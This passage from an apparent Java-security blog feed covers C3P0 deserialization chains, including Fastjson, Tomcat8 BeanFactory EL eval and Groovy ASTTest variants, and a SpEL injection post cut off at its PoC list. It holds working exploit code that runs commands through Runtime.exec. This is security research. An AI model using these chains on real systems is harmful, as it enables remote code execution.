class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>低版本的fastjson</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">        <span class="string">&quot;&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>但是这里其实是有问题的我们的流程上来看。就是fastjson在反序列化的时候会先调用构造方法在去调用setter getter方法那既然这样的话我们的set就没有用了那为什么还能继续触发漏洞呢</p><p>关键点在其父类的set方法里<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756365687-2bbad0d3-815a-4f71-9f52-c2824c9b5716.png" alt=""></p><p>当我们调用该setter时，首先会与旧的<code>userOverridesAsString</code>属性比较，这里旧值为<code>null</code>，新值为我们构造的<code>userOverridesAsString</code>，因此这里会进入if判断。跟进<code>vcs.fireVetoableChange</code>实例化了一个<code>PropertyChangeEvent</code>对象</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756600052-880f1d64-2a8d-4a92-85e8-7fcdeddcfa63.png" alt="">然后跟进<code>fireVetoableChange(</code>方法，最后在375行这个地方调用了<code>WrapperConnectionPoolDataSource#vetoableChange</code></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756619381-c06e3e30-a22a-4676-b071-4919b99980dc.png" alt=""></p><p>跟进去<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733756759849-9929f98e-6583-4165-ad31-f19143eb7d3d.png" alt="">如果<code>propName</code>变量为<code>userOverridesAsString</code>，则会直接反序列化传入的十六进制字符串并将返回的对象赋值给<code>userOverrides</code>属性。C3P0通过这种方式，在set完<code>userOverridesAsString</code>属性后直接对其进行解析，减少了一次类初始化操作。</p><h2 id="c3p0不出网">c3p0不出网</h2><p>不论是URLClassLoader加载远程类，还是JNDI注入，都需要目标机器能够出网。而加载Hex字符串的方式虽然不用出网，但却有Fastjson等的相关依赖。那么如果目标机器不出网，又没有Fastjson依赖的话，C3P0链又该如何利用呢？</p><p>在JNDI高版本利用中，我们可以加载本地的Factory类进行攻击，而利用条件之一就是该工厂类至少存在一个<code>getObjectInstance()</code>方法。比如通过加载Tomcat8中的<code>org.apache.naming.factory.BeanFactory</code>进行EL表达式注入</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733757389442-ba078bd2-ade1-4e11-91ec-13424359baf0.png" alt=""></p><p>可以看到和jndi高版本绕过很像假设存在Tomcat8中的<code>org.apache.naming.factory.BeanFactory</code>。</p><p>就可以进行利用。</p><h3 id="poc-4">poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Tomcat8</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Tomcat8_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> resourceRef;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Serial</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//反射修改connectionPoolDataSource属性值</span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase,c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化流写入文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Deserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Tomcat8_Loader</span> <span class="variable">tomcat8_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat8_Loader</span>();</span><br><span class="line">        Pool_Serial(tomcat8_loader);</span><br><span class="line">        Pool_Deserial();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似的还有Grovy依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Grovy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Tomcat8_Loader</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=parseClass&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">&quot;@groovy.transform.ASTTest(value=&#123;\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;    assert java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;)\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;&#125;)\n&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;def x\n&quot;</span>;</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>,script));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ref;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Serial</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">//反射修改connectionPoolDataSource属性值</span></span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase,c);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化流写入文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Pool_Deserial</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;exp.bin&quot;</span>));</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Tomcat8_Loader</span> <span class="variable">tomcat8_loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tomcat8_Loader</span>();</span><br><span class="line">        Pool_Serial(tomcat8_loader);</span><br><span class="line">        Pool_Deserial();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文章参考：<a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><p><a href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;介绍&lt;/h2&gt;
&lt;p&gt;这里直接搬运一下&lt;/p&gt;
&lt;p&gt;C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。&lt;/p&gt;
&lt;p&gt;JDBC是Java </summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="C3p0" scheme="https://oceanzbz.github.io/tags/C3p0/"/>
    
  </entry>
  
  <entry>
    <title>Java表达式注入</title>
    <link href="https://oceanzbz.github.io/post/e323032e.html"/>
    <id>https://oceanzbz.github.io/post/e323032e.html</id>
    <published>2024-12-30T05:49:27.000Z</published>
    <updated>2025-03-05T07:24:36.794Z</updated>
    
    <content type="html"><![CDATA[<p>spel基础参考：<a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%90%E7%AE%97">https://www.mi1k7ea.com/2020/01/10/SpEL</a></p><h2 id="SpEL简介">SpEL简介</h2><p>在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。</p><p>在Spring系列产品中，SpEL是表达式计算的基础，实现了与Spring生态系统所有产品无缝对接。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEL可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量Java代码。</p><p>SpEL有许多特性：</p><ul><li>使用Bean的ID来引用Bean</li><li>可调用方法和访问对象的属性</li><li>可对值进行算数、关系和逻辑运算</li><li>可使用正则表达式进行匹配</li><li>可进行集合操作</li></ul><h3 id="SpEL定界符——">SpEL定界符——#{}</h3><p>SpEL使用#{}作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。</p><p>这里需要注意#{}和${}的区别：</p><ul><li>#{}就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</li><li>${}主要用于加载外部属性文件中的值；</li><li>两者可以混合使用，但是必须#{}在外面，${}在里面，如#{‘${}’}，注意单引号是字符串类型才添加的；</li></ul><h3 id="SpEL表达式注入漏洞">SpEL表达式注入漏洞</h3><h3 id="漏洞原理">漏洞原理</h3><p>SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：</p><ul><li>SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。</li><li>StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。</li></ul><p>SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。</p><p>由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.Expression;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainApp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);</span><br><span class="line">        System.out.println(expression.getValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PoC-Bypass整理">PoC&amp;Bypass整理</h3><p>下面我们来整理下各种利用的PoC，这里默认把定界符#{}去掉。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 